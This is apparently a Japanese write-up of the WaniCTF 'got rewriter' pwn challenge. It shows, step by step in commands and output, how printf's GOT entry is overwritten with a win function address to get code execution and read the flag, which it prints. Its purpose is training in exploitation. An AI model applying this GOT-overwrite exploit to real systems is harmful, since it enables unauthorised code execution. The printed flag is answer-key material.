# got rewriter:PWN:pts
nc got.wanictf.org 9004  
- global offset table (GOT)の仕組みを理解する必要があります。  
- objdump -d -M intel ./pwn04 | less  

使用ツール例  
- [netcat (nc)](https://github.com/wani-hackase/memo-setup-pwn-utils#netcat)  
- [objdump](https://github.com/wani-hackase/memo-setup-pwn-utils#objdump)  

セキュリティ保護  
- Partial RELocation ReadOnly (RELRO)  
- Stack Smash Protection (SSP)有効  
- No eXecute bit(NX)有効  
- Position Independent Executable (PIE)無効  

[pwn04](pwn04)　　　　[pwn04.c](pwn04.c)  

# Solution
接続すると以下のようにアドレスを書き換えられるようだ。  
```bash
$ nc got.wanictf.org 9004
Welcome to GOT rewriter!!!
win = 0x400807
Please input target address (0x600e10-0x6010b0): 0x0
Your input address is 0x0.
you can't rewrite 0x0!
Please input target address (0x600e10-0x6010b0): 0x600e10
Your input address is 0x600e10.
Please input rewrite value: 0
Your input rewrite value is 0x0.

*0x600e10 <- 0x0.


Segmentation fault (core dumped)
```
問題名の通り、gotを書き換えwinに飛ばしてやる。  
まずはobjdumpで確認する。  
```bash
$ objdump -d -M intel ./pwn04 | less
~~~
00000000004006d0 <printf@plt>:
  4006d0:       ff 25 62 09 20 00       jmp    QWORD PTR [rip+0x200962]        # 601038 <printf@GLIBC_2.2.5>
  4006d6:       68 04 00 00 00          push   0x4
  4006db:       e9 a0 ff ff ff          jmp    400680 <.plt>
~~~
```
printfが0x601038のようなので、そこを以下のように書き換える。  
```bash
$ nc got.wanictf.org 9004
Welcome to GOT rewriter!!!
win = 0x400807
Please input target address (0x600e10-0x6010b0): 0x601038
Your input address is 0x601038.
Please input rewrite value: 0x400807
Your input rewrite value is 0x400807.

*0x601038 <- 0x400807.


congratulation!
ls
chall
flag.txt
redir.sh
cat flag.txt
FLAG{we-c4n-f1y-with-gl0b41-0ffset-tab1e}
^C
```
flagが得られた。  

## FLAG{we-c4n-f1y-with-gl0b41-0ffset-tab1e}